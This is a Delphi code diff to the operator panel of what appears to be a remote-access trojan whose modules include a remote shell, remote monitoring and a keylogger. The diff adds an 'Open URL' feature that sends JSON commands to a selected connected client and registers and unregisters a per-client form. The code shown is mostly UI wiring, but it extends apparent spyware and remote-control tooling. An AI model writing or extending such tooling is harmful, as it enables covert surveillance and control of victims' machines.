@@ -16,6 +16,7 @@ uses
   UnitRemoteShell,
   UnitRemoteMonitoring,
   UnitKeylogger,
+  UnitOpenURL,
   Vcl.WinXCtrls;
 
 type
@@ -149,8 +150,46 @@ begin
 end;
 
 procedure TForm1.OpenURL1Click(Sender: TObject);
+var
+  SelectedLine: TncLine;
+  LInfo       : TClientInfo;
+  F8          : TForm8;
+  ClientID    : string;
 begin
-//Popup menu Open URL Zone.
+  if (FServerManager = nil) or (csDestroying in ComponentState) then Exit;
+
+  if ListView1.Selected = nil then
+  begin
+    MessageBox(Handle, 'Lutfen once bir client secin.', 'Open URL',
+               MB_OK or MB_ICONWARNING);
+    Exit;
+  end;
+
+  SelectedLine := TncLine(ListView1.Selected.Data);
+  if SelectedLine = nil then
+  begin
+    MessageBox(Handle, 'Secili client bilgisi okunamadi.', 'Open URL',
+               MB_OK or MB_ICONERROR);
+    Exit;
+  end;
+
+  F8 := FServerManager.GetOpenURLForm(SelectedLine);
+
+  ClientID := 'Unknown';
+  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
+    ClientID := LInfo.ID;
+
+  if not Assigned(F8) then
+  begin
+    F8 := TForm8.Create(Application);
+    FServerManager.RegisterOpenURLForm(SelectedLine, F8);
+  end;
+
+  F8.SetupForClient(SelectedLine, ClientID,
+                    FServerManager.SendJSON,
+                    FServerManager.UnregisterOpenURLForm);
+  F8.Show;
+  F8.BringToFront;
 end;
 
 procedure TForm1.AddLog(Category: TLogCategory; const Msg: string);
@@ -409,6 +448,7 @@ begin
   FServerManager.UnregisterRemoteShellForm(aLine);
   FServerManager.UnregisterMonitoringForm(aLine);
   FServerManager.UnregisterKeyloggerForm(aLine);
+  FServerManager.UnregisterOpenURLForm(aLine);
 end;
 
 procedure TForm1.OnInfoReceived(aLine: TncLine; JSONObj: TJSONObject);
